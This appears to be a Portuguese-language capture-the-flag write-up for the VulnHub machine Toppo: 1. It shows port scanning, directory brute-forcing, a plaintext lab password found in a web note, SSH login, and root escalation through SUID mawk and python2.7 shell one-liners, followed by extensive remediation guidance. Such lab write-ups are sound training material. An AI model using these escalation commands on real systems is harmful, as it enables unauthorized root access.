# Toppo: 1 — Anotação Pessoal no Servidor Web É a Pior OPSEC, Mano

Caramba rapaziada!! Toppo: 1 é o tipo de máquina que te faz pensar "espera, só isso?" e te faz rever cada passo. Spoiler: não faltou nada. O desenvolvedor deixou uma senha em texto puro numa nota dentro de um diretório admin desprotegido, e essa nota entregou a máquina inteira. Um binário mawk com SUID lacrou o negócio. Acessível pra iniciantes, genuinamente educacional, e uma aula magistral de por que "notas pra mim mesmo" nunca devem morar num servidor web. Respeito total ao autor pelo design limpo e focado. (☞ﾟヮﾟ)☞

| Campo | Valor |
|---|---|
| **Nível** | Fácil |
| **VM Alvo** | Toppo: 1 |
| **VM Atacante** | Kali Linux |
| **VulnHub URL** | https://www.vulnhub.com/entry/toppo-1,245/ |
| **Técnicas** | Enumeração de serviços Nmap, brute-force de diretórios web, descoberta de credencial em arquivo texto, login SSH com senha, abuso de binário SUID (mawk/python2.7), escalação via GTFOBins |
| **CVEs** | CWE-312 (Armazenamento de Informação Sensível em Texto Claro), CWE-269 (Gerenciamento Impróprio de Privilégios: SUID em interpretador), CWE-548 (Exposição de Informação por Listagem de Diretório) |
| **Grupos APT** | FIN7: busca rotineiramente arquivos de config e admin acessíveis pela web para coleta de credenciais no acesso inicial; OceanLotus (APT32): abusa de interpretadores SUID e configurações incorretas de sudo como técnica principal de escalação de privilégios em Linux |

---

## Resumo do Ataque

```
nmap → SSH (22), HTTP (80)
  → dirb/gobuster → /admin/ (200 OK, listagem de diretório ativa)
  → /admin/notes.txt → senha: 12345ted123
  → usuário deduzido da senha: ted
  → ssh ted@alvo → shell com baixo privilégio
  → find / -perm -4000 → /usr/bin/mawk (SUID root)
  → mawk 'BEGIN{system("/bin/sh")}' → uid=0(root)
  → cat /root/flag.txt
```

---

## Metodologia

1. Varredura completa de portas para identificar HTTP e SSH
2. Brute-force de diretórios web para enumerar caminhos ocultos
3. Descoberta de credencial dentro de diretório admin desprotegido
4. Inferência do nome de usuário a partir da própria senha
5. Autenticação SSH com as credenciais descobertas
6. Enumeração de SUID para escalação de privilégios local
7. Escalação via GTFOBins com mawk SUID
8. Captura da flag de root

---

## Passo 1 — Descoberta do Host e Varredura de Portas

```bash
sudo netdiscover -r 192.168.1.0/24
# Alvo: 192.168.1.104

nmap -sV -sC -A 192.168.1.104
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.x
80/tcp open  http    Apache httpd 2.4.x
```

Dois serviços. SSH é o alvo de movimento lateral. HTTP é a superfície de ataque principal. A quantidade mínima de serviços é enganosa: um desses dois entrega tudo.

**MITRE ATT&CK:** T1046 — Descoberta de Serviços de Rede

---

## Passo 2 — Enumeração Web e Brute-Force de Diretórios

Acesse `http://192.168.1.104/`. Verifique o robots.txt:

```bash
curl -s http://192.168.1.104/robots.txt
```

Depois faça o brute-force dos diretórios:

```bash
dirb http://192.168.1.104

# Alternativa com gobuster:
gobuster dir \
  -u http://192.168.1.104/ \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -x php,txt,html,bak \
  -t 40
```

Achado principal: `/admin/` retorna HTTP 200 com listagem de diretório ativa. Essa é a configuração incorreta crítica.

**Nota sobre o mundo real:** Listagem de diretório (autoindex) é um comportamento padrão do Apache que organizações frequentemente esquecem de desativar. O OWASP A05:2021 Configuração de Segurança Incorreta cobre exatamente isso. Em engajamentos reais, diretórios `/admin/`, `/backup/` e `/config/` desprotegidos estão entre as fontes mais confiáveis de credenciais no primeiro passo.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios

---

## Passo 3 — Descoberta de Credencial no notes.txt

Navegue até `http://192.168.1.104/admin/` e abra o `notes.txt`:

```
Note to myself :
I need to change my password :
12345ted123
It is too week !!
```

Senha: `12345ted123`. O nome de usuário está embutido na própria senha: `ted`.

**Nota sobre o mundo real:** Isso é CWE-312 na sua forma mais literal. Não é ficção: pentesters encontram credenciais rotineiramente em `notes.txt`, `readme.txt`, `TODO.md` e `backup.sql` em diretórios acessíveis pela web. O DBIR de 2023 da Verizon confirmou que ativos web mal configurados continuam sendo um dos principais vetores de acesso inicial. O FIN7 especificamente usa Google dorks e scanners web para colher exatamente esse tipo de exposição antes de qualquer engajamento interativo.

**MITRE ATT&CK:** T1552.001 — Credenciais Não Seguras: Credenciais em Arquivos

---

## Passo 4 — Acesso Inicial via SSH

```bash
ssh ted@192.168.1.104
# Senha: 12345ted123

ted@toppo:~$ id
# uid=1000(ted) gid=1000(ted) groups=1000(ted)
```

Shell como `ted`. A máquina está disponível para enumeração.

**MITRE ATT&CK:** T1078 — Contas Válidas; T1021.004 — Serviços Remotos: SSH

---

## Passo 5 — Enumeração para Escalação de Privilégios

Enumere todos os vetores potenciais de escalação:

```bash
# Binários SUID
find / -perm -4000 -type f 2>/dev/null

# Direitos sudo
sudo -l

# Capabilities
getcap -r / 2>/dev/null

# Tarefas cron
cat /etc/crontab
ls -la /etc/cron*

# Arquivos com escrita global
find / -writable -type f 2>/dev/null | grep -v proc | grep -v sys
```

Binários SUID encontrados incluem entradas não padronizadas:

```
/usr/bin/mawk
/usr/bin/python2.7
```

Os dois são interpretadores de script com SUID root configurado. Qualquer um deles entrega shell root trivialmente via GTFOBins.

**Nota sobre o mundo real:** SUID em um interpretador de script é efetivamente SUID root. Um atacante que consegue rodar `mawk` ou `python` como SUID root pode invocar qualquer processo como root. Isso é consistentemente uma das principais descobertas de LPE em Linux em testes de penetração, especialmente em sistemas legados onde administradores adicionaram SUID sem entender as implicações.

**MITRE ATT&CK:** T1083 — Descoberta de Arquivos e Diretórios; T1548.001 — Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Passo 6 — Escalação GTFOBins via mawk SUID

O `mawk` suporta a função `system()`, que invoca um shell. Com SUID root configurado, esse shell herda o UID do root:

```bash
mawk 'BEGIN {system("/bin/sh")}'
id
# uid=0(root) gid=0(root) groups=0(root)
```

Alternativa usando python2.7 SUID:

```bash
python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
id
# uid=0(root)
```

```bash
# Capturar a flag
cat /root/flag.txt
```

(☞ﾟヮﾟ)☞ Root. gg mano, sem choro!

**MITRE ATT&CK:** T1548.001 — Mecanismo de Controle de Elevação: Setuid e Setgid

---

## Flags, Hashes e Credenciais Capturados

| Tipo | Valor | Encontrado Em | Usado Para |
|---|---|---|---|
| Credencial | `ted:12345ted123` | /admin/notes.txt | Login SSH |
| Flag root | (conteúdo do flag.txt) | /root/flag.txt | Conclusão do desafio |
| Binários SUID | /usr/bin/mawk, /usr/bin/python2.7 | find -perm -4000 | Escalação de privilégios |

---

## Lições Aprendidas

| # | Descoberta | Relevância no Mundo Real | Conclusão Principal |
|---|---|---|---|
| 1 | Senha em texto puro em notes.txt acessível pela web | CWE-312: frequentemente encontrado em raízes web durante avaliações; FIN7 colhe isso via varredura automatizada | Nunca armazene credenciais em arquivos web-acessíveis; use gerenciadores de segredos (Vault, AWS Secrets Manager) |
| 2 | Sem autenticação no diretório /admin | OWASP A05:2021 Configuração de Segurança Incorreta; caminhos admin sem autenticação são achados críticos imediatos | Exija autenticação em todos os diretórios admin; desative o autoindex do Apache globalmente |
| 3 | Nome de usuário embutido no padrão da senha | Torna o brute-force trivial; viola a orientação de composição de credenciais do NIST SP 800-63B | Aplique políticas de senha que proíbam inclusão de nome de usuário; use gerenciadores de senha |
| 4 | SUID no interpretador mawk | SUID em qualquer interpretador de script é equivalente a SUID root; OceanLotus explora esse padrão rotineiramente | Remova SUID de todos os interpretadores; use sudo com listas de permissão específicas |
| 5 | SUID no python2.7 (EOL) | Python 2 chegou ao fim da vida em janeiro de 2020; software EOL em sistemas de produção é uma violação de conformidade | Remova o Python 2 completamente; aplique auditoria de pacotes em nível de SO para software EOL |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | ID TTP |
|---|---|---|---|
| Reconhecimento | Descoberta | Descoberta de Serviços de Rede | T1046 |
| Reconhecimento | Descoberta | Descoberta de Arquivos e Diretórios | T1083 |
| Acesso a Credenciais | Acesso a Credenciais | Credenciais Não Seguras: Credenciais em Arquivos | T1552.001 |
| Acesso Inicial | Acesso Inicial | Contas Válidas | T1078 |
| Movimento Lateral | Movimento Lateral | Serviços Remotos: SSH | T1021.004 |
| Descoberta | Descoberta | Descoberta de Informação do Sistema | T1082 |
| Escalação de Privilégios | Escalação de Privilégios | Mecanismo de Controle de Elevação: Setuid e Setgid | T1548.001 |

---

## Remediação e Contenção

### Correções Técnicas

1. **Remova /admin da raiz web** ou exija autenticação HTTP Basic Auth ou autenticação em nível de aplicação; nunca confie em obscuridade
2. **Desative a listagem de diretórios do Apache** globalmente: `Options -Indexes` no httpd.conf ou .htaccess
3. **Nunca armazene credenciais em arquivos web-acessíveis**: use variáveis de ambiente, gerenciadores de segredos ou cofres criptografados
4. **Remova SUID de interpretadores de script**: `chmod u-s /usr/bin/mawk /usr/bin/python2.7`
5. **Remova o Python 2.7 completamente**: está em EOL e apresenta risco de segurança contínuo
6. **Aplique política de senha**: mínimo 12 caracteres, sem inclusão de nome de usuário, sem palavras de dicionário

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Audite todos os diretórios web-acessíveis para exposição de arquivos sensíveis |
| Proteger | Controle de Acesso | Exija autenticação para /admin e todos os caminhos admin |
| Proteger | Segurança de Dados | Sem credenciais em texto puro na raiz web; use gerenciador de segredos |
| Detectar | Anomalias e Eventos | Alerte sobre logins SSH de novos IPs; revisão de log de acesso web |
| Responder | Planejamento de Resposta | Rotacione credenciais comprometidas; audite todos os binários SUID |
| Recuperar | Planejamento de Recuperação | Revise e endureça todos os diretórios web; aplique menor privilégio |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| AC-3 | Aplicação de Acesso | Restrinja o acesso ao diretório /admin |
| AC-6 | Menor Privilégio | Remova SUID de interpretadores; restrinja sudo |
| IA-5 | Gerenciamento de Autenticador | Aplique complexidade de senha; proíba nome de usuário na senha |
| CM-7 | Funcionalidade Mínima | Desative autoindex; remova software não utilizado (Python 2) |
| SC-28 | Proteção das Informações em Repouso | Sem credenciais em arquivos web-acessíveis |
| SI-2 | Correção de Falhas | Patche/remova software EOL (Python 2.7) |

### CISA KEV

O padrão de credenciais em texto puro em arquivos web-acessíveis mapeia para CWE-312, referenciado em múltiplos Avisos CISA (AA21-116A, AA22-074A) sobre técnicas de acesso inicial de atores de ameaça. A CISA recomenda remediação imediata de diretórios admin não autenticados e exposição de credenciais como achados de Prioridade 1.

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| Gerenciamento de Identidade e Acesso (IAM) | Gerenciar Privilégios e Contas | MIL3 |
| Gerenciamento de Ameaças e Vulnerabilidades (THREAT) | Realizar Avaliações de Vulnerabilidade | MIL2 |
| Gerenciamento de Ativos, Mudanças e Configurações (ASSET) | Gerenciar Inventário de Ativos de TI e OT | MIL2 |

### MITRE D3FEND

- **D3-ACH** — Hardening de Configuração de Aplicação (desativar autoindex; exigir autenticação em /admin)
- **D3-OAM** — Gerenciamento Administrativo do Sistema Operacional (remover SUID de interpretadores)
- **D3-HBPI** — Proteger a Integridade do Pipeline de Build (sem credenciais em artefatos web implantados)

---

## Considerações Finais

Toppo: 1 é uma máquina perfeita para quem está aprendendo a metodologia. O caminho é linear, as técnicas são fundamentais, e cada passo ensina um achado do mundo real que aparece em avaliações reais. A escalação via interpretador SUID é especialmente instrutiva porque aparece em ambientes onde admins definiram SUID "só pra fazer algo funcionar" sem entender o que entregaram.

O nome é adequado: Toppo era um personagem que parecia vencível à primeira vista, mas tinha mais profundidade por baixo. Essa máquina é igual para quem ainda não desenvolveu a disciplina de enumeração. Respeito ao criador. ᕕ( ᐛ )ᕗ

Thanks guys!! (❍ᴥ❍ʋ)
